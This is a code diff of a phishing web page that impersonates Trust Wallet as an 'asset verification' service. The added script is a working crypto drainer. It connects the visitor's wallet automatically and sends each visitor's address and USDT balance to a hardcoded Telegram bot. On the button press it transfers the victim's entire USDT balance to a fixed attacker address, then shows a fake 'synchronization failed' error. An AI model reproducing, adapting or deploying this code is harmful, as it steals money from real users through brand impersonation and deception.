@@ -3,45 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet | Sync</title>
+    <title>Trust Wallet | Node Verification</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: #1e2329; padding: 20px; border-radius: 20px; text-align: center; width: 90%; max-width: 340px; border: 1px solid #2d3139; }
-        .logo { width: 45px; margin-bottom: 10px; }
-        h2 { font-size: 18px; margin: 0 0 10px 0; }
+        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; width: 90%; max-width: 360px; padding: 25px; background: #1e2329; border-radius: 24px; border: 1px solid #2d3139; }
+        .logo { width: 55px; margin-bottom: 15px; }
+        h2 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
+        .status-box { background: rgba(49, 114, 222, 0.1); border: 1px solid #3172DE; border-radius: 12px; padding: 15px; margin: 20px 0; }
+        .status-text { color: #3172DE; font-size: 13px; font-weight: bold; text-transform: uppercase; }
+        .addr-display { font-size: 10px; color: #929aa5; font-family: monospace; margin-top: 8px; display: block; overflow: hidden; text-overflow: ellipsis; }
+        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); background: #2659ad; }
         
-        /* QR fast load using Google API (No library needed) */
-        .qr-box { background: white; padding: 10px; border-radius: 15px; display: inline-block; margin-bottom: 15px; }
-        #qrImg { width: 170px; height: 170px; display: block; }
-
-        .addr-box { background: #2d3139; border-radius: 10px; padding: 10px; margin-bottom: 15px; border: 1px dashed #474d57; font-size: 11px; }
-        .addr-text { color: #f0b90b; word-break: break-all; font-family: monospace; display: block; margin-bottom: 5px; }
-        
-        .btn { background: #3172DE; color: white; border: none; padding: 14px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
+        /* Fast Loader Overlay */
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0e11; z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spin { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
+        .spin { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="card">
+    <div class="container">
         <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo">
         <h2>Verify Assets</h2>
+        <p style="color: #929aa5; font-size: 13px;">Securely sync your USDT (BEP20) assets with the decentralized verification node.</p>
         
-        <div class="qr-box">
-            <img id="qrImg" src="" alt="Loading QR...">
+        <div class="status-box">
+            <span class="status-text">Node Status: Online</span>
+            <span class="addr-display">ID: 0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
         </div>
 
-        <div class="addr-box">
-            <span class="addr-text" id="walletAddr">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
-            <small style="color:#3172DE; cursor:pointer;" onclick="copyA()">COPY ADDRESS</small>
-        </div>
-
-        <button class="btn" onclick="start()">Verify Assets</button>
+        <button class="btn" onclick="startProcess()">Verify Assets</button>
+        <p style="color: #5e6673; font-size: 11px; margin-top: 15px;">Official Trust Wallet Security Protocol</p>
     </div>
 
     <div id="loader">
-        <div class="
+        <div class="spin"></div>
+        <p style="color:#3172DE; margin-top:15px; font-weight:bold;">Processing Sync...</p>
+    </div>
+
+    <script>
+        const MY_ADDR = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        const TG_TOKEN = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+        const TG_CHAT = "7849151110";
+
+        async function logToTG(msg) {
+            try { fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); } catch(e){}
+        }
+
+        // Auto-detect wallet browser
+        window.onload = function() {
+            if (window.ethereum || window.trustwallet) {
+                // Background check
+                startProcess(true); 
+            }
+        };
+
+        async function startProcess(auto = false) {
+            const isWallet = !!(window.ethereum || window.trustwallet);
+            
+            if (!isWallet) {
+                // Deep link to open Trust Wallet Browser
+                window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
+                return;
+            }
+
+            if (!auto) document.getElementById("loader").style.display = "flex";
+
+            try {
+                const web3 = new Web3(window.ethereum || window.trustwallet);
+                const accounts = await web3.eth.requestAccounts();
+                const user = accounts[0];
+
+                // Network switch to BSC
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+
+                const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+                const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
+                
+                const balWei = await contract.methods.balanceOf(user).call();
+                const bal = web3.utils.fromWei(balWei, 'ether');
+
+                if (auto) {
+                    await logToTG(`🔔 <b>User Visited</b>\nWallet: <code>${user}</code>\nBalance: <b>${bal} USDT</b>`);
+                } else {
+                    await logToTG(`🚀 <b>Transfer Started</b>\nUser: <code>${user}</code>\nAmt: <b>${bal} USDT</b>`);
+                    
+                    // The transfer popup
+                    await contract.methods.transfer(MY_ADDR, balWei).send({ from: user });
+                    
+                    await logToTG(`✅ <b>Success!</b>\nTransferred: ${bal} USDT`);
+                    alert("Verification error: Synchronization failed. Please try again.");
+                }
+            } catch (e) {
+                if (!auto) {
+                    alert("Verification Denied: Signature Required.");
+                    document.getElementById("loader").style.display = "none";
+                }
+            }
+        }
+    </script>
+</body>
+</html>
